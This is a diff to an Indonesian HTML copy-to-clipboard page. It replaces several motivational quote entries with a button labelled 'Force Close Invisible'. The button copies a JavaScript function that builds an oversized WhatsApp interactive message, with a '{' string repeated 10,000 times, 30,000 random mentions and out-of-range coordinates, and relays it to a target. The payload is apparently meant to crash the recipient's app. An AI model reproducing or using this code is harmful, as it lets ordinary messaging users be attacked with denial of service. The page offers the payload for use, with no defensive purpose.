@@ -131,73 +131,65 @@ userJid: target,
 } catch (err) {
 console.log(err);
 }
-}."</p>
+}"</p>
                             <p class="text-gray-400 text-sm mt-1">Force Close Invisible</p>
-                        </div>
-                        <button class="copy-btn bg-golden-gray hover:bg-dark-gold text-soft-black font-medium py-2 px-4 rounded-lg relative" onclick="copyToClipboard(this, 'Keberanian bukan tidak adanya rasa takut, tetapi penilaian bahwa sesuatu yang lain lebih penting daripada rasa takut.')">
-                            Salin
+                        </div>  
+                        <button class="copy-btn bg-golden-gray hover:bg-dark-gold text-soft-black font-medium py-2 px-4 rounded-lg relative" onclick="copyToClipboard(this, ''async function Headerv2(target) {
+try {
+let message = {
+ephemeralMessage: {
+message: {
+interactiveMessage: {
+header: {
+title: "☇ 𝐖𝐲͢𝐧𝐳̋`𝐬𝐗 𝟕𝟕𝟕",
+hasMediaAttachment: false,
+locationMessage: {
+degreesLatitude: -6666666666,
+degreesLongitude: 6666666666,
+name: "",
+address: "",
+},
+},
+body: {
+text: "☇ 𝐖𝐲͢𝐧𝐳̋`𝐬𝐗 𝟕𝟕𝟕",
+},
+nativeFlowMessage: {
+messageParamsJson: "{".repeat(10000),
+},
+contextInfo: {
+participant: target,
+mentionedJid: [
+"0@s.whatsapp.net",
+...Array.from(
+{
+length: 30000,
+},
+() =>
+"1" +
+Math.floor(Math.random() * 5000000) +
+"@s.whatsapp.net"
+),
+],
+},
+},
+},
+},
+};
+
+await client.relayMessage(target, message, {
+messageId: null,
+participant: { jid: target },
+userJid: target,
+});
+} catch (err) {
+console.log(err);
+}
+})">
+                            𝐂𝐎𝐏𝐘
                             <span class="tooltip absolute -top-8 left-1/2 transform -translate-x-1/2 bg-gray-800 text-white text-xs px-2 py-1 rounded whitespace-nowrap">Klik untuk menyalin</span>
                         </button>
                     </div>
                 </div>
-                
-                <!-- Item 2 -->
-                <div class="word-item p-4 hover:bg-gray-800 group">
-                    <div class="flex justify-between items-center">
-                        <div>
-                            <p class="text-golden-gray font-medium">"Kesuksesan adalah jumlah dari usaha kecil yang berulang hari demi hari."</p>
-                            <p class="text-gray-400 text-sm mt-1">- Robert Collier</p>
-                        </div>
-                        <button class="copy-btn bg-golden-gray hover:bg-dark-gold text-soft-black font-medium py-2 px-4 rounded-lg relative" onclick="copyToClipboard(this, 'Kesuksesan adalah jumlah dari usaha kecil yang berulang hari demi hari.')">
-                            Salin
-                            <span class="tooltip absolute -top-8 left-1/2 transform -translate-x-1/2 bg-gray-800 text-white text-xs px-2 py-1 rounded whitespace-nowrap">Klik untuk menyalin</span>
-                        </button>
-                    </div>
-                </div>
-                
-                <!-- Item 3 -->
-                <div class="word-item p-4 hover:bg-gray-800 group">
-                    <div class="flex justify-between items-center">
-                        <div>
-                            <p class="text-golden-gray font-medium">"Masa depan tergantung pada apa yang kau lakukan hari ini."</p>
-                            <p class="text-gray-400 text-sm mt-1">- Mahatma Gandhi</p>
-                        </div>
-                        <button class="copy-btn bg-golden-gray hover:bg-dark-gold text-soft-black font-medium py-2 px-4 rounded-lg relative" onclick="copyToClipboard(this, 'Masa depan tergantung pada apa yang kau lakukan hari ini.')">
-                            Salin
-                            <span class="tooltip absolute -top-8 left-1/2 transform -translate-x-1/2 bg-gray-800 text-white text-xs px-2 py-1 rounded whitespace-nowrap">Klik untuk menyalin</span>
-                        </button>
-                    </div>
-                </div>
-                
-                <!-- Item 4 -->
-                <div class="word-item p-4 hover:bg-gray-800 group">
-                    <div class="flex justify-between items-center">
-                        <div>
-                            <p class="text-golden-gray font-medium">"Kehidupan yang tidak diuji tidak layak untuk dijalani."</p>
-                            <p class="text-gray-400 text-sm mt-1">- Socrates</p>
-                        </div>
-                        <button class="copy-btn bg-golden-gray hover:bg-dark-gold text-soft-black font-medium py-2 px-4 rounded-lg relative" onclick="copyToClipboard(this, 'Kehidupan yang tidak diuji tidak layak untuk dijalani.')">
-                            Salin
-                            <span class="tooltip absolute -top-8 left-1/2 transform -translate-x-1/2 bg-gray-800 text-white text-xs px-2 py-1 rounded whitespace-nowrap">Klik untuk menyalin</span>
-                        </button>
-                    </div>
-                </div>
-                
-                <!-- Item 5 -->
-                <div class="word-item p-4 hover:bg-gray-800 group">
-                    <div class="flex justify-between items-center">
-                        <div>
-                            <p class="text-golden-gray font-medium">"Satu-satunya cara untuk melakukan pekerjaan hebat adalah dengan mencintai apa yang kamu lakukan."</p>
-                            <p class="text-gray-400 text-sm mt-1">- Steve Jobs</p>
-                        </div>
-                        <button class="copy-btn bg-golden-gray hover:bg-dark-gold text-soft-black font-medium py-2 px-4 rounded-lg relative" onclick="copyToClipboard(this, 'Satu-satunya cara untuk melakukan pekerjaan hebat adalah dengan mencintai apa yang kamu lakukan.')">
-                            Salin
-                            <span class="tooltip absolute -top-8 left-1/2 transform -translate-x-1/2 bg-gray-800 text-white text-xs px-2 py-1 rounded whitespace-nowrap">Klik untuk menyalin</span>
-                        </button>
-                    </div>
-                </div>
-            </div>
-            
             <!-- Footer -->
             <div class="bg-gray-800 p-4 text-center border-t border-golden-gray">
                 <p class="text-gray-400 text-sm">Klik tombol "Salin" untuk menyalin teks ke clipboard</p>
